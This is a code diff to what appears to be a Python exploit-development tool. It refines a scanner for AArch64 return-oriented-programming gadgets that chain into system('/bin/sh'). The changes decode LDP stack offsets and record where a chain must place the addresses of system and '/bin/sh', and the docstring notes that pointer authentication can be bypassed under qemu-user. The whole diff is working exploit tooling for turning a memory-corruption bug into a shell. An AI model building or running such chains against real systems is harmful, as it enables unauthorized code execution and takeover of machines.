@@ -632,11 +632,23 @@ def _a64_words(data: bytes):
             yield va + (p - off), int.from_bytes(data[p:p + 4], "little")
 
 
+_A64_LDP_SIGNED = 0xA9400000                             # LDP Xt,Xt2,[Xn,#imm]   (no writeback)
+_A64_LDP_POSTIDX = 0xA8C00000                            # LDP Xt,Xt2,[Xn],#imm   (post-index)
+
+
 def _a64_ldp_regs(w: int):
     """(Rt, Rt2, Rn) if `w` is a 64-bit LDP (post-index / signed-offset / pre-index), else None."""
     if (w & 0xFFC00000) in (0xA8C00000, 0xA9400000, 0xA9C00000):
         return w & 0x1F, (w >> 10) & 0x1F, (w >> 5) & 0x1F
     return None
+
+
+def _a64_ldp_imm(w: int) -> int:
+    """The signed byte displacement of a 64-bit LDP (imm7 field, scaled by 8)."""
+    imm7 = (w >> 15) & 0x7F
+    if imm7 & 0x40:
+        imm7 -= 0x80
+    return imm7 * 8
 
 
 def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
@@ -649,7 +661,9 @@ def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
 
     Chaining a loader whose {R1,R2} == a caller's {S,B} gives system("/bin/sh"): the loader sets
     xS=&"/bin/sh", xB=&system and x30=caller; the caller does x0=xS; blr xB. Returns
-    {"callers":[{va,src,br}], "loaders":[{va,r1,r2}]} (reg indices). Pointer-authentication
+    {"callers":[{va,src,br}], "loaders":[{va,r1,r2,a_off}]} (reg indices; a_off = the first ldp's
+    [sp,#A] displacement, so the chain can place xR1 at sp+a_off and xR2 at sp+a_off+8, while x29/x30
+    land at sp+0/+8 from the post-indexed restore). Pointer-authentication
     (`autiasp`) is a no-op under qemu-user, so those epilogues are usable gadgets."""
     words = list(_a64_words(data))
     callers, loaders = [], []
@@ -668,18 +682,29 @@ def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
         r1, r2, rn = regs
         if rn != 31 or r1 in (29, 30, 31) or r2 in (29, 30, 31):
             continue                                     # must load two GPRs from sp
+        # The first ldp must be the signed-offset form `ldp xR1,xR2,[sp,#A]` (no writeback): sp is
+        # unchanged until the final post-indexed restore, so every popped word sits at a fixed offset
+        # from the loader's entry sp -- xR1 at +A, xR2 at +A+8, x29 at +0, x30 at +8. A writeback form
+        # (pre/post-index) would move sp mid-gadget and break that fixed layout, so skip it: the
+        # chain-builder relies on a_off to place &system / &"/bin/sh" exactly.
+        if (w & 0xFFC00000) != _A64_LDP_SIGNED:
+            continue
+        a_off = _a64_ldp_imm(w)
+        if a_off < 0:                                    # words must land in the forward overflow
+            continue
         for k in range(i + 1, min(i + 8, len(words))):
             wk = words[k][1]
             if wk in _A64_NOPS:
                 continue
             lr = _a64_ldp_regs(wk)
-            if lr and lr[0] == 29 and lr[1] == 30 and lr[2] == 31:   # ldp x29, x30, [sp], #M
+            if (lr and lr[0] == 29 and lr[1] == 30 and lr[2] == 31      # ldp x29, x30, [sp], #M
+                    and (wk & 0xFFC00000) == _A64_LDP_POSTIDX):         # post-index: x29@sp+0, x30@+8
                 for j in range(k + 1, min(k + 4, len(words))):
                     wj = words[j][1]
                     if wj in _A64_NOPS:
                         continue
                     if wj == _A64_RET:
-                        loaders.append({"va": va, "r1": r1, "r2": r2})
+                        loaders.append({"va": va, "r1": r1, "r2": r2, "a_off": a_off})
                     break
                 break
             if lr and (lr[0] in (r1, r2) or lr[1] in (r1, r2)):
